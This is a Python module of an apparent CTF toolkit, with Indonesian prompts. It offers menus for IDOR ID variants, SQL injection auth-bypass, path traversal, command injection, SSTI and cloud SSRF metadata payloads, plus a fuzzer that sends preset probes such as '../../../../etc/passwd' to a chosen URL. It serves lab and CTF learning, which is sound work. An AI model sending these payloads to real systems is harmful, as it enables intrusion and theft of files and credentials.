from __future__ import annotations

import json
import time
import urllib.request
import urllib.error

from ctf_toolkit.ui.common import print_table, read_bytes_prompt, show_text_hex
from ctf_toolkit.ui.console import (
    HAS_RICH,
    get_rich_console,
    render_header,
    console_info,
    console_success,
    console_warn,
)
from ctf_toolkit.ui.inspector import inspect_output
from ctf_toolkit.utils.io import error, safe_input, warn
from ctf_toolkit.utils.menu import run_menu

try:
    from rich.table import Table
    from rich import box
except ImportError:
    pass


def idor_payload_menu() -> None:
    from ctf_toolkit.web.idor import (
        build_idor_payloads,
        default_padding_widths,
        iter_id_values,
        parse_id_range,
        parse_padding_widths,
        range_count,
    )

    print("\n=== Web > IDOR Payload Crafter ===")
    raw = safe_input("Target ID atau range (contoh 1 atau 1-10): ").strip()
    if not raw:
        warn("ID kosong.")
        return

    try:
        start, end = parse_id_range(raw)
        total = range_count(start, end)
        if total > 200:
            confirm = safe_input(f"Range berisi {total} ID, lanjut? [y/N]: ").strip().lower()
            if confirm != "y":
                return
        param = safe_input("Nama parameter JSON [default id]: ").strip() or "id"
        widths_raw = safe_input("Padding widths (pisah koma, kosong=auto): ")
        widths = parse_padding_widths(widths_raw, default_padding_widths(max(start, end)))
        for value in iter_id_values(start, end):
            print(f"\n=== ID {value} ===")
            payloads = build_idor_payloads(value, widths)
            if not payloads:
                warn("Tidak ada padding yang valid.")
                continue
            for payload in payloads:
                rows = [
                    ["raw", payload["raw"]],
                    ["raw_base64", payload["raw_base64"]],
                    ["raw_md5", payload["raw_md5"]],
                    ["raw_hex", payload["raw_hex"]],
                    ["padded", payload["padded"]],
                    ["padded_base64", payload["padded_base64"]],
                    ["padded_md5", payload["padded_md5"]],
                    ["padded_hex", payload["padded_hex"]],
                ]
                print_table(["variant", "value"], rows)
                print("json:")
                print(f"  raw   : {json.dumps({param: payload['raw']})}")
                print(f"  b64   : {json.dumps({param: payload['padded_base64']})}")
                print(f"  md5   : {json.dumps({param: payload['raw_md5']})}")
                print(f"  hex   : {json.dumps({param: payload['raw_hex']})}")
                print(f"  padded: {json.dumps({param: payload['padded']})}")
    except ValueError as exc:
        warn(f"Error: {exc}")


def mass_assignment_menu() -> None:
    from ctf_toolkit.web.logic import scan_mass_assignment_files

    print("\n=== Web > Mass Assignment Static Heuristic ===")
    root = safe_input("Root path [default .]: ").strip() or "."
    names_raw = safe_input("Target files (default app.py,models.py): ").strip()
    names = [name.strip() for name in names_raw.split(",") if name.strip()] or ["app.py", "models.py"]
    try:
        results = scan_mass_assignment_files(root, names)
    except ValueError as exc:
        warn(f"Error: {exc}")
        return
    if not results:
        error("Tidak ada pola mass assignment yang terdeteksi.")
        return

    rows: list[list[str]] = []
    for item in results:
        snippet = str(item["snippet"])
        if len(snippet) > 90:
            snippet = snippet[:87] + "..."
        rows.append([str(item["file"]), str(item["line"]), str(item["reason"]), snippet])
    print_table(["file", "line", "reason", "snippet"], rows)


def attacks_menu() -> None:
    run_menu(
        "Web > Attacks & Logic",
        {
            "1": ("IDOR Payload Matrix", idor_payload_menu),
            "2": ("Mass Assignment Static Heuristic", mass_assignment_menu),
        },
    )


def payload_diff_matrix_action() -> None:
    """Send multiple payload variations against a target URL and compare responses in a diff matrix."""
    print("\n=== Web Payload Diff Matrix (Posting/Burp-Style) ===")
    url_template = safe_input("Target URL with FUZZ keyword (e.g. http://localhost:8080/search?q=FUZZ): ").strip()
    if not url_template:
        warn("URL kosong.")
        return
    if "FUZZ" not in url_template:
        console_info("Keyword FUZZ tidak ditemukan, FUZZ akan otomatis di-append di akhir URL.")
        url_template += "FUZZ" if "?" in url_template else "?q=FUZZ"

    print("\nPilih Preset Payload:")
    print("  [1] SQL Injection Quick Probes (' OR 1=1, ' UNION SELECT, admin' --)")
    print("  [2] LFI / Traversal Probes (../../../../etc/passwd, flag.txt)")
    print("  [3] SSTI Probes ({{7*7}}, ${7*7}, <%= 7*7 %>)")
    print("  [4] Custom Payloads (Pisahkan dengan koma)")
    choice = safe_input("Pilihan [default 1]: ").strip() or "1"

    if choice == "1":
        payloads = ["", "'", "''", "' OR 1=1 --", "' OR 'a'='a", "' UNION SELECT null,null --", "admin' --"]
    elif choice == "2":
        payloads = ["", "index.html", "../flag.txt", "../../../../etc/passwd", "....//....//etc/passwd", "php://filter/convert.base64-encode/resource=index.php"]
    elif choice == "3":
        payloads = ["", "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{config.items()}}"]
    else:
        custom_raw = safe_input("Masukkan payload dipisah koma: ")
        payloads = [p.strip() for p in custom_raw.split(",") if p.strip()] or ["test"]

    console_info(f"Mengirim {len(payloads)} request ke target...")
    results = []
    baseline_len = None

    for p in payloads:
        target_url = url_template.replace("FUZZ", urllib.parse.quote(p))
        t0 = time.time()
        status_code = 0
        resp_len = 0
        preview = ""

        try:
            req = urllib.request.Request(
                target_url,
                headers={"User-Agent": "CTF-Toolkit-Workbench/1.0"},
            )
            with urllib.request.urlopen(req, timeout=5) as resp:
                status_code = resp.status
                body = resp.read()
                resp_len = len(body)
                preview = body[:40].decode("latin1", errors="replace").replace("\n", " ")
        except urllib.error.HTTPError as e:
            status_code = e.code
            try:
                body = e.read()
                resp_len = len(body)
                preview = body[:40].decode("latin1", errors="replace").replace("\n", " ")
            except Exception:
                pass
        except Exception as e:
            status_code = 0
            preview = f"ERR: {str(e)[:30]}"

        latency_ms = int((time.time() - t0) * 1000)
        if baseline_len is None:
            baseline_len = resp_len
        delta = resp_len - baseline_len

        results.append({
            "payload": p if p else "<baseline>",
            "status": status_code,
            "size": resp_len,
            "delta": delta,
            "latency_ms": latency_ms,
            "preview": preview,
        })

    console = get_rich_console()
    if HAS_RICH and console:
        table = Table(title=f"📊 Payload Diff Matrix: {url_template}", box=box.ROUNDED, border_style="cyan")
        table.add_column("Payload", style="bold yellow")
        table.add_column("Status", justify="center", width=8)
        table.add_column("Size", justify="right", width=10)
        table.add_column("Δ Size", justify="right", width=10)
        table.add_column("Latency", justify="right", width=10)
        table.add_column("Response Preview", style="dim")

        for r in results:
            st_color = "green" if r["status"] == 200 else ("yellow" if r["status"] in (301, 302, 403) else "red")
            delta_str = f"+{r['delta']}" if r["delta"] > 0 else str(r["delta"])
            table.add_row(
                r["payload"],
                f"[{st_color}]{r['status']}[/{st_color}]",
                f"{r['size']} B",
                delta_str,
                f"{r['latency_ms']} ms",
                r["preview"],
            )
        console.print(table)
    else:
        print("\n--- Response Diff Matrix ---")
        for r in results:
            print(f"  [{r['status']}] {r['payload']:<25} : {r['size']} B (Δ {r['delta']:+d}) in {r['latency_ms']}ms | {r['preview']}")

    inspect_output(results, title="Payload Diff Matrix Result", op_name="web_diff_matrix")


def menu() -> None:
    from ctf_toolkit.web.helpers import (
        REQUEST_TEMPLATES,
        b64url_decode,
        b64url_encode,
        build_command_injection_payload,
        build_lfi_traversal_path,
        build_sqli_auth_bypass,
        build_ssrf_metadata_url,
        jwt_decode_no_verify,
        url_decode,
        url_encode,
    )

    def url_encode_action() -> None:
        try:
            out = url_encode(safe_input("Text: "))
            inspect_output(out, title="URL Encoded", op_name="url_encode")
        except ValueError as exc:
            warn(f"Error: {exc}")

    def url_decode_action() -> None:
        try:
            out = url_decode(safe_input("Text: "))
            inspect_output(out, title="URL Decoded", op_name="url_decode")
        except ValueError as exc:
            warn(f"Error: {exc}")

    def b64url_encode_action() -> None:
        try:
            data = read_bytes_prompt("Data", safe_input)
            out = b64url_encode(data)
            inspect_output(out, title="Base64URL Encoded", op_name="b64url_encode")
        except ValueError as exc:
            warn(f"Error: {exc}")

    def b64url_decode_action() -> None:
        try:
            out = b64url_decode(safe_input("b64url: "))
            inspect_output(out, title="Base64URL Decoded", op_name="b64url_decode")
        except ValueError as exc:
            warn(f"Error: {exc}")

    def jwt_decode_action() -> None:
        try:
            token = safe_input("JWT: ")
            payload = jwt_decode_no_verify(token)
            warn("JWT ini TIDAK diverifikasi signature.")
            inspect_output(payload, title="JWT Decoded (Unverified)", op_name="jwt_decode")
        except ValueError as exc:
            warn(f"Error: {exc}")

    def request_templates_action() -> None:
        warn("Template hanya untuk lab/CTF. Toolkit tidak melakukan auto-scan.")
        for name, payloads in REQUEST_TEMPLATES.items():
            print(f"\n[{name.upper()}]")
            for payload in payloads:
                print(f"- {payload}")

    def attacks_action() -> None:
        attacks_menu()

    def lfi_action() -> None:
        from ctf_toolkit.web.traversal import generate_traversal_payloads
        target = safe_input("Target file [default flag.txt]: ").strip() or "flag.txt"
        depth_raw = safe_input("Max depth [default 5]: ").strip()
        depth = int(depth_raw) if depth_raw.isdigit() else 5
        payloads = generate_traversal_payloads(target, depth)
        inspect_output(payloads, title=f"LFI Payloads ({len(payloads)})", op_name="lfi_crafter")

    def sqli_action() -> None:
        user = safe_input("Target username [default admin]: ").strip() or "admin"
        res = {}
        for tech in ["or_true", "or_1_equals_1", "or_true_hash", "admin_closed", "union_admin"]:
            res[tech] = build_sqli_auth_bypass(username=user, technique=tech)
        inspect_output(res, title="SQLi Auth Bypass Payloads", op_name="sqli_crafter")

    def cmdi_action() -> None:
        base = safe_input("Base IP/Host [default 127.0.0.1]: ").strip() or "127.0.0.1"
        cmd = safe_input("Command to execute [default cat /flag.txt]: ").strip() or "cat /flag.txt"
        res = {}
        for sep in [";", "|", "&&", "||", "subshell", "newline"]:
            res[sep] = repr(build_command_injection_payload(base_arg=base, separator=sep, command=cmd))
        inspect_output(res, title="Command Injection Delimiters", op_name="cmdi_crafter")

    def ssrf_action() -> None:
        res = {}
        for provider in ["aws", "gcp", "digitalocean", "docker_internal", "localhost"]:
            res[provider] = build_ssrf_metadata_url(provider)
        inspect_output(res, title="Cloud SSRF Endpoints", op_name="ssrf_crafter")

    def cheatsheet_action() -> None:
        from ctf_toolkit.web.cheatsheets import format_cheatsheet_text
        cat = safe_input("Filter kategori (SQLi, LFI, SSTI, XSS, Command Injection, JWT) [kosong=semua]: ").strip() or None
        text = format_cheatsheet_text(cat)
        inspect_output(text, title="Web Exploitation Cheatsheet", op_name="web_cheatsheet")

    run_menu(
        "Web",
        {
            "1": ("URL Encode", url_encode_action),
            "2": ("URL Decode", url_decode_action),
            "3": ("Base64URL Encode", b64url_encode_action),
            "4": ("Base64URL Decode", b64url_decode_action),
            "5": ("JWT Decode (no verify)", jwt_decode_action),
            "6": ("Request Templates Generator", request_templates_action),
            "7": ("Attacks / Logic Helpers", attacks_action),
            "8": ("LFI / Path Traversal Crafter", lfi_action),
            "9": ("SQLi Auth Bypass Crafter", sqli_action),
            "10": ("Command Injection Crafter", cmdi_action),
            "11": ("Cloud SSRF Prober Endpoints", ssrf_action),
            "12": ("Web Payload Diff Matrix (Posting/Burp-Style)", payload_diff_matrix_action),
            "13": ("Curated Exploitation Cheatsheets (GetsFlag Parity)", cheatsheet_action),
        },
    )
